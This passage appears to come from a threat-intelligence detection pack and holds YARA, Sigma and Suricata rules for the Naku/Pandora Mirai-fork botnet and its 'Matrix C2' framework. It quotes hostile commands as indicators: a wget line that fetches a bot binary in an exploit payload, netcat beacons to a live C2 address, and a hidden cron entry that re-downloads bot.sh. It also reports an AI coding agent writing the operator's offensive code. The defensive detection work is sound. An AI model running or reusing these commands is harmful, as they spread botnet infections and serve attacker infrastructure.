         ($wire_hb and $cnc_port and $cron_hidden)
      )
}
```

---

### Rule 10 — MAL_Discord_OperatorID_Snowflake_PandoraNet

**Detection Priority:** LOW
**Rationale:** Narrow detection on the literal Discord operator ID `1441591352927326259` as it appears verbatim in operator artifacts (whatineed.txt, potential Discord-related configs). The snowflake decodes to account creation timestamp 2025-11-22T00:49:22 UTC (~182 days old at investigation). This rule catches operator-artifact exposure instances; low deployment priority since the specific operator may rotate accounts, but useful for hunting exposed operator-OPSEC failures.
**ATT&CK Coverage:** T1584.004 (Compromise Infrastructure: Server)
**Confidence:** HIGH — the Discord ID is operator-self-disclosed in captured artifact; snowflake decode is reproducible
**False Positive Risk:** LOW — specific 19-digit Discord snowflake ID combined with `PandoraNet` or `bot_register` reduces FP surface to near-zero
**Deployment:** Filesystem scanner on suspected operator hosts, open-directory crawler, OSINT pivot hunting

```yara
rule MAL_Discord_OperatorID_Snowflake_PandoraNet {
   meta:
      description = "Narrow detection on the literal Discord operator snowflake ID 1441591352927326259 as it appears in operator artifacts (whatineed.txt prompt, Discord bot configs, operator notes). Snowflake decodes to account creation timestamp 2025-11-22T00:49:22 UTC — fresh ops persona ~182 days old at investigation. Also detects PandoraNet botnet ID co-occurrence in operator-exposed files. Use as a pivot/hunting rule rather than high-confidence detection."
      license = "CC BY-NC 4.0 - https://creativecommons.org/licenses/by-nc/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
      date = "2026-05-26"
      hash1 = "d888a16cd6aa76f62a329906db4f241e6bc23ff5f21d61e754ade8ccab6da0d0"
      family = "Rovodev Operator Artifacts"
      malware_type = "Operator Identity Artifact"
      campaign = "UTA-2026-014"
      id = "584bfc4c-dccc-5e4e-ad2c-7d0d16e6832c"
   strings:
      // Operator-self-disclosed Discord ID (from whatineed.txt)
      $discord_id  = "1441591352927326259" ascii
      // PandoraNet botnet ID (operator-bespoke; not observed in any other host in Hunt 365-day index)
      $pandoranet  = "PandoraNet" ascii fullword
      // Operator infrastructure references
      $ionos_ip    = "87.106.143.220" ascii
      $backup_ip   = "87.106.54.213" ascii
      // Context anchors
      $my_user     = "my user ID is" ascii nocase
      $discord_ctx = "discord" nocase ascii
   condition:
      filesize < 5MB and
      (
         ($discord_id and $my_user) or
         ($discord_id and $pandoranet) or
         ($discord_id and $ionos_ip) or
         ($pandoranet and $ionos_ip and $discord_ctx)
      )
}
```

---

## Sigma Rules

### Pandora-Mirai (Naku ELF Bot Suite)

---

### Sigma Rule 1 — ELF Arch-Tagged Filename Execution (Naku/Pandora Family)

**Detection Priority:** HIGH
**Rationale:** Naku.{arch} and pandora.{arch} filenames with architecture-tag suffixes (arm, arm5, arm6, arm7, m68k, mips, mpsl, ppc, sh4, spc, x86) combined with process execution on Linux servers is specific to this and related Mirai-fork dropper families. IoT arch suffixes in executable filenames on server hosts are high-confidence malicious indicators.
**ATT&CK Coverage:** T1059.004 (Unix Shell), T1190 (Exploit Public-Facing Application)
**Confidence:** HIGH
**False Positive Risk:** LOW — `.arm5`, `.m68k`, `.mpsl`, `.spc` suffixes on executables on server hosts have no legitimate software use case; `.arm` and `.x86` suffixes are slightly more common but rare in combination with `Naku` or `pandora` prefixes

```yaml
title: ELF IoT Arch-Tagged Filename Execution on Linux Server — Naku/Pandora Mirai Family
id: c4495249-9b11-406c-b4ca-5c099eb8ca81
status: test
description: >-
  Detects execution of ELF binaries with IoT-targeted architecture-tag suffixes (arm5, arm6, arm7, m68k, mips, mpsl, ppc, sh4, spc) associated with the Naku/Pandora-Mirai 11-architecture IoT botnet family (UTA-2026-014). These filenames (Naku.{arch}, pandora.{arch}, nig) are specific to the Pandora-Mirai dropper's payload distribution and execution pattern. Execution of such binaries on server-class hosts indicates active compromise and botnet payload staging.
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
    - https://vms.drweb.com/virus/?i=22410691&lng=en
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.execution
    - attack.defense-evasion
    - attack.command-and-control
logsource:
    category: process_creation
    product: linux
detection:
    selection_naku:
        Image|contains:
            - 'Naku.arm'
            - 'Naku.m68k'
            - 'Naku.mips'
            - 'Naku.mpsl'
            - 'Naku.ppc'
            - 'Naku.sh4'
            - 'Naku.spc'
            - 'Naku.x86'
            - 'pandora.arm'
            - 'pandora.m68k'
            - 'pandora.mips'
            - 'pandora.mpsl'
            - 'pandora.sh4'
            - 'pandora.spc'
    selection_argv:
        CommandLine|contains:
            - 'PandoraNet'
            - './nig realtek'
            - './nig huawei'
            - 'pandora_bot'
    condition: 1 of selection_*
falsepositives:
    - Cross-compilation test environments deploying IoT firmware — limit to production server hosts and IoT-adjacent network segments
    - IoT development workstations building multi-arch toolchains
level: high
```

---

### Sigma Rule 2 — Hidden-Filename-Prefix Cron Entry Creation

**Detection Priority:** HIGH
**Rationale:** `/etc/cron.d/.cache_update` uses a dot-prefix hidden-filename to evade `ls /etc/cron.d/` output on most terminal prompts. Cron entry creation with dot-prefix filenames in `/etc/cron.d/` is a specific evasion technique used by this operator (and other Mirai-family malware) to survive `crontab -l` checks and blunt incident response.
**ATT&CK Coverage:** T1053.003 (Cron), T1564.001 (Hidden Files and Directories)
**Confidence:** HIGH
**False Positive Risk:** LOW — hidden-prefix cron entries in `/etc/cron.d/` are not a standard system administration practice; dot-prefix files in this directory are almost exclusively malicious on production servers

```yaml
title: Hidden-Prefix Cron Entry Creation in /etc/cron.d — Pandora-Mirai Persistence Pattern
id: 6625f3f7-4e6f-40cb-905b-039786de8561
status: test
description: >-
  Detects creation of dot-prefix hidden-filename cron entries in /etc/cron.d/ as used by the Pandora-Mirai (UTA-2026-014) persistent_bot.sh 5-vector persistence installer. The specific entry /etc/cron.d/.cache_update is the operator's primary cron persistence vector, scheduled to wget-pipe bot.sh from 87.106.143.220 every 5 minutes. Hidden-prefix filenames in this directory evade simple cron audits and are not a standard administration pattern.
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.persistence
    - attack.defense-evasion
logsource:
    category: file_event
    product: linux
detection:
    selection:
        TargetFilename|startswith: '/etc/cron.d/.'
    filter_known_legit:
        TargetFilename:
            - '/etc/cron.d/.placeholder'
    condition: selection and not filter_known_legit
falsepositives:
    - Extremely rare legitimate administration scripts that use dot-prefix cron files — review all instances
    - Configuration management tools (Puppet, Chef, Ansible) deploying hidden cron entries — verify against known CM policy
level: high
```

---

### Sigma Rule 3 — Mirai 5-Vector Persistence Pattern

**Detection Priority:** HIGH
**Rationale:** The operator's `persistent_bot.sh` writes to 5 persistence vectors within a short execution window: `/etc/cron.d/.cache_update` + `/etc/rc.local` + `/etc/init.d/sysupdate` + `/etc/systemd/system/system-update.service` + `~/.bashrc` + `~/.profile`. No single vector is unique, but the 5-vector pattern within a time window distinguishes this installer from legitimate system configuration.
**ATT&CK Coverage:** T1037.004 (RC Scripts), T1053.003 (Cron), T1543.002 (Systemd Service), T1546.004 (Unix Shell Configuration Modification)
**Confidence:** HIGH
**False Positive Risk:** MEDIUM — individual persistence mechanisms overlap with legitimate deployment tools; the 5-mechanism window is more specific. Tuning: add time-window correlation (all 5 within 60 seconds) to reduce FP rate.

```yaml
title: Pandora-Mirai 5-Vector Linux Persistence Pattern — Multi-Mechanism Installer
id: 311787eb-af20-4ec5-90b3-ef3cb6797771
status: test
description: >-
  Detects the 5-vector Linux persistence pattern used by the Pandora-Mirai (UTA-2026-014) persistent_bot.sh installer. Monitors for creation of masquerade-named persistence files (/etc/init.d/sysupdate, /etc/systemd/system/system-update.service) alongside shell RC modification and hidden cron entry creation within a short time window. Each vector alone has moderate FP risk; co-occurrence within 60 seconds on a non-deployment host is high-confidence malicious.
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.persistence
    - attack.defense-evasion
logsource:
    category: file_event
    product: linux
detection:
    selection_sysupdate:
        TargetFilename: '/etc/init.d/sysupdate'
    selection_systemd:
        TargetFilename: '/etc/systemd/system/system-update.service'
    selection_cron_hidden:
        TargetFilename|startswith: '/etc/cron.d/.'
    selection_rclocal:
        TargetFilename: '/etc/rc.local'
    condition: 2 of selection_*
falsepositives:
    - Legitimate system update scripts that use similar naming — verify service content references known-good update infrastructure
    - Server provisioning tools (cloud-init, Ansible) creating multiple persistence mechanisms simultaneously — correlate with deployment pipeline activity
    - Security tooling (OSSEC, Wazuh agent) that creates init.d and systemd units at install time
level: high
```

---

### Sigma Rule 4 — PandoraNet Botnet ID in Process Command Line or Environment

**Detection Priority:** HIGH
**Rationale:** `PandoraNet` is the operator-bespoke botnet ID suffixed by architecture tag (e.g., `pandora_bot PandoraNet.arm7`). Not observed on any other host in Hunt.io 365-day index. Its presence in process command line or environment variables is a direct active-infection indicator.
**ATT&CK Coverage:** T1095 (Non-Application Layer Protocol), T1059.004 (Unix Shell)
**Confidence:** HIGH
**False Positive Risk:** LOW — `PandoraNet` is operator-specific and not found in any legitimate software; any process executing with this argument is the Pandora-Mirai bot active on the host

```yaml
title: PandoraNet Botnet ID in Process Command Line — Active Pandora-Mirai Infection
id: 481ee321-8631-4a9d-b1b6-87e8a5676690
status: test
description: >-
  Detects the PandoraNet operator-bespoke botnet ID string in process command line arguments, indicating active execution of the Pandora-Mirai IoT botnet (UTA-2026-014). The format is 'pandora_bot PandoraNet.{arch}' where arch is one of 11 IoT CPU architectures. This string is not observed in any other host in threat intelligence indexing and indicates active bot process on the monitored system.
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.execution
    - attack.command-and-control
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains: 'PandoraNet'
    condition: selection
falsepositives:
    - None — PandoraNet is an operator-bespoke botnet identifier not used by any known legitimate software
level: critical
```

---

### Sigma Rule 5 — /dev/watchdog Access by Non-Watchdog Process

**Detection Priority:** MEDIUM
**Rationale:** Mirai-canonical persistence tactic: bot opens `/dev/watchdog` and runs ioctl WDIOC_KEEPALIVE in a loop to prevent IoT device from rebooting, keeping the infection persistent. On server hosts (vs true IoT devices), this is highly anomalous — only kernel watchdog daemons legitimately interact with `/dev/watchdog`.
**ATT&CK Coverage:** T1014 (Rootkit), T1053.003 (Cron)
**Confidence:** HIGH
**False Positive Risk:** LOW on server hosts; MEDIUM on IoT-class devices where watchdog daemons are more common

```yaml
title: Non-Watchdog Process Opening /dev/watchdog — Mirai-Canonical Persistence Tactic
id: 716bce61-4dcb-4479-b815-1391f5c7cd43
status: test
description: >-
  Detects processes other than known watchdog daemons (watchdogd, systemd-watchdog) opening /dev/watchdog or /dev/misc/watchdog. This is a canonical Mirai botnet persistence mechanism — the bot opens the watchdog device and continuously pets it (ioctl WDIOC_KEEPALIVE) to prevent IoT device auto-reboot, keeping the infection persistent across watchdog-triggered reset cycles. Observed in Naku.arm (Pandora-Mirai family, UTA-2026-014) and generic to all Mirai/Sora derivative bots.
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
    - https://attack.mitre.org/techniques/T1014/
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.defense-evasion
    - attack.persistence
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains:
            - '/dev/watchdog'
            - '/dev/misc/watchdog'
    filter_legit:
        Image|endswith:
            - '/watchdogd'
            - '/systemd'
            - '/busybox'
    condition: selection and not filter_legit
falsepositives:
    - Embedded system watchdog management tools on IoT/embedded Linux — tune filter_legit for your environment
    - Custom watchdog wrapper scripts in industrial control environments
    - Hardware monitoring agents on servers with watchdog hardware support
level: medium
```

---

### Matrix C2 Python Framework

---

### Sigma Rule 6 — Outbound TCP/1337 to Matrix C2 Operator Infrastructure

**Detection Priority:** HIGH
**Rationale:** TCP/1337 outbound to `87.106.143.220` is the Matrix C2 JSON-over-TCP C2 channel used by `persistent_bot.sh` (bot_register + heartbeat messages) and `mirai_clone.py` (pipe-delimited infection reports). Port 1337 outbound from server hosts to this specific IP is a direct active C2 communication indicator.
**ATT&CK Coverage:** T1071.001 (Web Protocols), T1095 (Non-Application Layer Protocol)
**Confidence:** HIGH
**False Positive Risk:** LOW — TCP/1337 is non-standard; combined with the specific operator IP, FP risk is near-zero

```yaml
title: Outbound TCP/1337 to Matrix C2 Operator Infrastructure — Active Bot C2 Channel
id: 23ab4d7b-192d-44ad-bad0-3e5d19514007
status: test
description: >-
  Detects outbound TCP connections to port 1337 at 87.106.143.220 (1&1 IONOS DE VPS), the Matrix C2 JSON-over-TCP command-and-control channel used by the Pandora-Mirai operator (UTA-2026-014). The bot_register and heartbeat messages use netcat (nc -w 5 87.106.143.220 1337) with JSON payloads. Port 1337 is non-standard for legitimate server egress; connections to this specific IP indicate active bot C2 or infection-report traffic.
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.command-and-control
logsource:
    category: network_connection
    product: linux
detection:
    selection:
        DestinationIp: '87.106.143.220'
        DestinationPort: 1337
    condition: selection
falsepositives:
    - No legitimate use case for TCP/1337 connections to this specific IP from server hosts
level: high
```

---

### Sigma Rule 7 — Outbound TCP/23 to Parasitic CNC on GetYourGroup Tourism VPS

**Detection Priority:** HIGH
**Rationale:** Outbound TCP/23 (Telnet) to `165.227.175.161` is the Naku/Pandora ELF bot's CNC connection — hardcoded inline in main() as a raw 32-bit constant. This IP is a compromised production tourism VPS (auvergne-rhone-alpes-for-groups.com). Any IoT device or server making an outbound TCP/23 connection to this IP is an active Naku bot connecting to its CNC.
**ATT&CK Coverage:** T1095 (Non-Application Layer Protocol), T1071.001 (Web Protocols)
**Confidence:** HIGH
**False Positive Risk:** LOW — TCP/23 outbound connections from server/IoT hosts are rare; this specific destination IP makes it specific to active Naku infection

```yaml
title: Outbound TCP/23 to Naku-Pandora CNC — Active Bot Connecting to Compromised Tourism VPS
id: c9d77df7-5af0-4863-afea-ca13e6ccd3ce
status: test
description: >-
  Detects outbound TCP connections to port 23 at 165.227.175.161 (DigitalOcean DO allocation — compromised GetYourGroup tourism VPS auvergne-rhone-alpes-for-groups.com). This is the hardcoded CNC endpoint for the Naku/Pandora-Mirai 11-architecture IoT botnet (UTA-2026-014), extracted via ARM ELF disassembly of Naku.arm (raw 32-bit constant 0xa1afe3a5 = 165.227.175.161, port 0x0017 = 23). CNC daemon planted on TCP/23 on a legitimate French tourism business VPS — parasitic hosting for OPSEC separation from operator-owned infrastructure.
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.command-and-control
logsource:
    category: network_connection
    product: linux
detection:
    selection:
        DestinationIp: '165.227.175.161'
        DestinationPort: 23
        Initiated: 'true'
    condition: selection
falsepositives:
    - No legitimate use case for Telnet connections to this specific IP
level: high
```

---

### Sigma Rule 8 — Discord-Bot Attack-Method Dispatch from Non-Developer Host

**Detection Priority:** MEDIUM
**Rationale:** Discord API egress from server hosts is anomalous in most environments. The Matrix C2 Discord bot dispatches DDoS attacks via the Discord API from the operator's server, not a user workstation. Any non-developer host making Discord API connections with attack-method dispatch patterns in the request body is a high-confidence indicator of DDoS-as-a-Service customer interface activity.
**ATT&CK Coverage:** T1059.007 (JavaScript), T1498.001 (Direct Network Flood)
**Confidence:** MODERATE — detecting request body content requires proxy/HTTPS-interception capability
**False Positive Risk:** MEDIUM — Discord egress from servers (bot hosting) is legitimate in developer/SaaS environments; rule requires process context to disambiguate

```yaml
title: Discord Bot API Egress with Attack-Method Dispatch Payload from Server Host
id: 7e3175bc-9a74-4c93-b358-de78d84250f4
status: test
description: >-
  Detects Discord API (discord.com/api/v9/) egress traffic from non-developer server hosts, indicative of the Matrix C2 DDoS-as-a-Service Discord-bot customer interface (UTA-2026-014). The Discord bot dispatches DDoS attack commands on behalf of paying customers via a JavaScript bot running on the operator's IONOS VPS. Discord bot traffic from production server hosts in non-developer environments is anomalous and warrants investigation. Higher-confidence detection requires proxy logs with content inspection to identify attack-method dispatch patterns (ovh-nuke, syn-storm, frag-storm keywords in message content).
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.command-and-control
    - attack.execution
logsource:
    category: network_connection
    product: linux
detection:
    selection_discord:
        DestinationHostname|contains: 'discord.com'
        DestinationPort: 443
        Initiated: 'true'
    filter_known_dev:
        Image|contains:
            - '/node_modules/'
            - 'discord.js'
    condition: selection_discord and not filter_known_dev
falsepositives:
    - Legitimate Discord bots hosted on server infrastructure — all Discord bot deployments on production servers
    - SaaS applications integrating Discord notifications
    - Developer environments testing Discord integrations
level: medium
```

---

### Operator OPSEC Artifacts (Rovodev)

---

### Sigma Rule 9 — Rovodev Sessions Directory Creation on Server Host

**Detection Priority:** MEDIUM
**Rationale:** `~/.rovodev/sessions/` directory creation on a server host indicates the Atlassian Rovodev AI coding agent is or was running on that system. Combined with `session_context.json` large file creation (1.24 MB primary session), this indicates an operator using Rovodev for server-side development — which in this case was offensive framework development. On server hosts (not developer workstations), Rovodev session directory creation is anomalous.
**ATT&CK Coverage:** T1587.001 (Develop Capabilities: Malware)
**Confidence:** MODERATE — Rovodev may legitimately run on some server hosts for DevOps automation; context-dependent
**False Positive Risk:** MEDIUM — Rovodev is a legitimate enterprise product; this rule targets anomalous use on server hosts specifically

```yaml
title: Rovodev AI Agent Sessions Directory Creation on Server Host — Potential AI-Augmented Offensive Operations
id: 273f8eea-72b3-48c7-a134-cdc5a65064d7
status: test
description: >-
  Detects creation of Atlassian Rovodev AI coding agent session artifacts (~/.rovodev/sessions/ directory, session_context.json files exceeding 100KB) on server hosts. In the UTA-2026-014 case, the operator used Rovodev on their IONOS VPS to author a complete offensive framework (Matrix C2). Rovodev session directories on production server hosts outside of known DevOps pipelines warrant investigation, particularly when co-located with /root/matrix/ or similar offensive framework paths.
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.resource-development
logsource:
    category: file_event
    product: linux
detection:
    selection_sessions:
        TargetFilename|contains: '/.rovodev/sessions/'
    selection_context:
        TargetFilename|endswith: '/session_context.json'
    condition: 1 of selection_*
falsepositives:
    - Legitimate DevOps teams using Rovodev on server hosts for infrastructure automation
    - CI/CD pipeline hosts running Rovodev for code generation tasks
    - Developer workstations (this rule is most useful on production server hosts; tune to exclude known developer environments)
level: medium
```

---

### Sigma Rule 10 — Rovodev Log File_Write Tool-Call Pattern

**Detection Priority:** MEDIUM
**Rationale:** The `rovodev.log` file (8.5 MB) captures the runtime CLI including `file_write` tool calls containing offensive content. Detection of log files with `file_write` tool-call patterns in combination with offensive Python content (`#!/usr/bin/env python3` in `initial_content`) is specific to AI-augmented offensive operations workflow. Useful for hunting exposed operator infrastructure.
**ATT&CK Coverage:** T1587.001 (Develop Capabilities: Malware)
**Confidence:** MODERATE — requires log content inspection capability
**False Positive Risk:** LOW for `file_write` + offensive Python content co-occurrence in Rovodev logs; MEDIUM for `file_write` alone

```yaml
title: Rovodev Log File_Write Tool-Call with Offensive Content — AI-Augmented Offensive Operations Evidence
id: 817e5ca2-7265-41b3-b344-bbf36afc3193
status: test
description: >-
  Detects Atlassian Rovodev AI coding agent runtime log (rovodev.log) containing file_write tool-call patterns with Python shebang initial_content, indicating the AI agent authored Python files during the session. In the UTA-2026-014 case, the 8.5 MB rovodev.log captured file_write calls producing attack_engine.py, master_control.py, stealth_agent.py, and the Discord bot JavaScript dispatch table. Content inspection of Rovodev logs for offensive capability markers can identify AI-augmented offensive operations in progress or recently completed.
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.resource-development
logsource:
    category: file_event
    product: linux
detection:
    selection_log:
        TargetFilename|endswith: '/rovodev.log'
    condition: selection_log
falsepositives:
    - All Rovodev installations generate rovodev.log — this rule fires on any host running Rovodev; tune to server hosts outside known DevOps pipelines
    - CI/CD pipeline hosts running Rovodev legitimately
level: low
```

---

### Sigma Rule 11 — 22-Char Bespoke Charset in File or Process Memory

**Detection Priority:** MEDIUM
**Rationale:** The string `1gba4cdom53nhp12ei0kfj` is the operator-bespoke 22-character random-string charset confirmed in all 11 Naku/Pandora ELF architectures (XOR-0x54 encoded in production builds, plaintext in arm7 debug build). Its presence in any file or process memory is a direct tracking signature for this operator's Mirai-fork lineage.
**ATT&CK Coverage:** T1027 (Obfuscated Files or Information), T1095 (Non-Application Layer Protocol)
**Confidence:** HIGH
**False Positive Risk:** LOW — this specific character set in this order is operator-bespoke; not found in any other host in Hunt 365-day index; near-zero probability of accidental match

```yaml
title: Naku/Pandora-Mirai Operator-Bespoke 22-Char Charset String — Family Tracking Signature
id: c9d201aa-2fbb-4e1e-b269-76cf28670998
status: test
description: >-
  Detects the operator-bespoke 22-character random-string charset '1gba4cdom53nhp12ei0kfj' in file content or process command lines. This string is present in all 11 architectures of the Naku/Pandora-Mirai ELF botnet (UTA-2026-014) — both XOR-0x54 encoded in stripped production builds and in plaintext in the arm7 debug build. It is not observed in any other host in threat intelligence indexing and constitutes a cross-architecture operator tracking signature. Detection in any context indicates Pandora-Mirai family presence.
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.defense-evasion
    - attack.command-and-control
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains: '1gba4cdom53nhp12ei0kfj'
    condition: selection
falsepositives:
    - None — this string is operator-bespoke and not used in any known legitimate software
level: high
```

---

### Sigma Rule 12 — busybox SORA Marker in ELF Binary on Server Hosts

**Detection Priority:** MEDIUM
**Rationale:** `/bin/busybox SORA` (XOR-0x54 decoded from Naku ELF binaries) is the Sora-fork derivative signature — replaces stock Mirai's `/bin/busybox MIRAI` token. Its presence as a command executed by a process on a server or IoT host indicates a Sora-derivative Mirai bot is executing. The Sora lineage includes this operator's Naku/Pandora family, other Sora forks, and variants.
**ATT&CK Coverage:** T1059.004 (Unix Shell), T1095 (Non-Application Layer Protocol)
**Confidence:** HIGH — this is a Sora-derivative-specific fork marker confirmed in Naku arm7 debug symbols and XOR-decoded from all 11 production builds
**False Positive Risk:** LOW on server hosts; busybox SORA is not a legitimate busybox parameter

```yaml
title: busybox SORA Marker Execution — Sora-Derivative Mirai-Fork Active on Host
id: 625a0af0-2c6e-48b5-89ea-0c7e6b191147
status: test
description: >-
  Detects execution of the '/bin/busybox SORA' command, which is the Sora-fork Mirai-derivative lineage signature. Decoded from XOR-0x54 region in all 11 Naku/Pandora-Mirai architectures (UTA-2026-014), replacing stock Mirai's '/bin/busybox MIRAI'. The Mirai bot calls this as part of its process enumeration and competitor-kill routine. Any process executing '/bin/busybox SORA' indicates active Sora-derivative bot execution on the host.
references:
    - https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/
author: The Hunters Ledger
date: 2026/05/26
tags:
    - attack.execution
    - attack.defense-evasion
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains: '/bin/busybox SORA'
    condition: selection
falsepositives:
    - None — '/bin/busybox SORA' is not a valid busybox applet call and has no legitimate use
level: high
```

---

## Suricata Signatures

---

**Detection Priority:** HIGH
**Rationale:** DNS query for github.com/keyosbuff/ pattern catches any operator referencing this (now-deleted) C2 leak repository. Useful for hunting operators referencing the upstream source in DNS or HTTP traffic.
**ATT&CK Coverage:** T1588.001 (Obtain Capabilities: Malware), T1584.004 (Compromise Infrastructure: Server)
**Confidence:** MODERATE — DNS query detection requires DNS logging; github.com is CDN-terminated so the URL path is in TLS, not plaintext
**False Positive Risk:** LOW — `keyosbuff` is the operator's referenced upstream; no known legitimate use of this GitHub handle

```suricata
# Rule 1 — DNS/HTTP reference to keyosbuff GitHub C2-Leak repository
# Note: github.com/keyosbuff/C2-Leak is now 404/deleted; DNS query for raw github.com
# won't surface the path; HTTP URL detection requires TLS inspection or non-HTTPS fetch.
# This rule catches any DNS resolution of github.com in context where keyosbuff appears
# in subsequent HTTP traffic (non-TLS) or in server-side log files.

alert dns $HOME_NET any -> any any (msg:"THL - Rovodev Operator C2-Leak GitHub Reference - DNS Query github.com from Suspicious Context"; dns.query; content:"github.com"; nocase; threshold: type limit, track by_src, count 1, seconds 300; sid:9001001; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Internal, signature_severity Major, tag UTA-2026-014;)

alert http $HOME_NET any -> any any (msg:"THL - Rovodev Operator keyosbuff C2-Leak Repository HTTP Reference - UTA-2026-014"; http.uri; content:"keyosbuff"; nocase; sid:9001002; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Major, tag UTA-2026-014;)
```

---

**Detection Priority:** HIGH
**Rationale:** HTTP GET requests to `87.106.143.220` or `87.106.54.213` for paths matching Naku or Pandora binary naming patterns (`/bins/Naku.`, `/Pandoras_Box/Pandora.`, `/bot.sh`) indicate active botnet reseeding or initial dropper download. These are operator-owned IONOS VPS hosts; HTTP to these IPs for these paths is a direct distribution-channel indicator.
**ATT&CK Coverage:** T1071.001 (Web Protocols), T1587.001 (Develop Capabilities: Malware)
**Confidence:** HIGH — URLs confirmed byte-verified in Naku binary plaintext exploit payloads
**False Positive Risk:** LOW — specific IPs + Naku/Pandora path patterns combined leave near-zero FP surface

```suricata
# Rule 2 — HTTP egress to operator IONOS pair fetching Naku/Pandora binaries
alert http $HOME_NET any -> 87.106.143.220 any (msg:"THL - Pandora-Mirai Binary Distribution Fetch from IONOS Primary - /bins/Naku or /Pandoras_Box/Pandora - UTA-2026-014"; http.uri; content:"/bins/Naku."; startswith; sid:9001003; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)

alert http $HOME_NET any -> 87.106.143.220 any (msg:"THL - Pandora-Mirai bot.sh Reseed Download from IONOS Primary - UTA-2026-014"; http.uri; content:"/bot.sh"; endswith; sid:9001004; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)

alert http $HOME_NET any -> 87.106.143.220 any (msg:"THL - Pandora-Mirai Binary Distribution Fetch /Pandoras_Box - UTA-2026-014"; http.uri; content:"/Pandoras_Box/Pandora."; startswith; sid:9001005; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)

alert http $HOME_NET any -> 87.106.54.213 any (msg:"THL - Pandora-Mirai Binary Distribution Fetch from IONOS Backup VPS - UTA-2026-014"; http.uri; content:"Naku."; sid:9001006; rev:1; metadata:affected_product Linux_IoT, attack_target Network, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)
```

---

**Detection Priority:** HIGH
**Rationale:** TCP/23 (Telnet) outbound to `165.227.175.161` is the Naku/Pandora bot's hardcoded CNC endpoint — a compromised French tourism VPS. Any device on your network initiating a TCP connection to this specific IP on port 23 is an active bot communicating with its CNC. Not subject to port-matching FP (legitimate Telnet traffic to this specific IP does not exist).
**ATT&CK Coverage:** T1095 (Non-Application Layer Protocol)
**Confidence:** HIGH — CNC endpoint confirmed via ARM ELF disassembly (raw 32-bit constant extraction)
**False Positive Risk:** LOW — TCP/23 to this specific destination is exclusively Naku bot CNC traffic

```suricata
# Rule 3 — TCP/23 outbound to Naku parasitic CNC on compromised tourism VPS
alert tcp $HOME_NET any -> 165.227.175.161 23 (msg:"THL - Naku-Pandora Mirai Bot CNC Connection to Parasitic Host on GetYourGroup Tourism VPS - UTA-2026-014"; flow:to_server,established; sid:9001007; rev:1; metadata:affected_product Linux_IoT, attack_target IoT_Device, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)
```

---

**Detection Priority:** HIGH
**Rationale:** HTTP GET/POST to Aruba Italy distribution servers (`80.211.94.16`, `80.211.111.10`) for Naku binary fetches is the exploit payload delivery pattern — hardcoded in the Realtek CVE-2014-8361 exploit payload: `wget http://80.211.94.16/Naku.mips -O nig`. These servers were operational January 2026; they have since gone dark (May 2026), but the pattern is useful if the operator rotates to a new Aruba account.
**ATT&CK Coverage:** T1071.001 (Web Protocols), T1190 (Exploit Public-Facing Application)
**Confidence:** HIGH — URLs byte-confirmed in Naku.arm .rodata section plaintext exploit payloads
**False Positive Risk:** LOW — fetching executable binaries from these specific IPs has no legitimate use case

```suricata
# Rule 4 — HTTP egress to Aruba Italy distribution servers
alert http $HOME_NET any -> 80.211.94.16 any (msg:"THL - Naku-Pandora Mirai Binary Fetch from Aruba Italy Distribution Server (80.211.94.16) - UTA-2026-014"; http.uri; content:"Naku."; sid:9001008; rev:1; metadata:affected_product Linux_IoT, attack_target IoT_Device, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)

alert http $HOME_NET any -> 80.211.111.10 any (msg:"THL - Naku-Pandora Mirai Binary Fetch from Aruba Italy Backup Distribution Server (80.211.111.10) - UTA-2026-014"; http.uri; content:"Naku."; sid:9001009; rev:1; metadata:affected_product Linux_IoT, attack_target IoT_Device, created_at 2026_05_26, deployment Perimeter, signature_severity Critical, tag UTA-2026-014;)
```

---

**Detection Priority:** HIGH
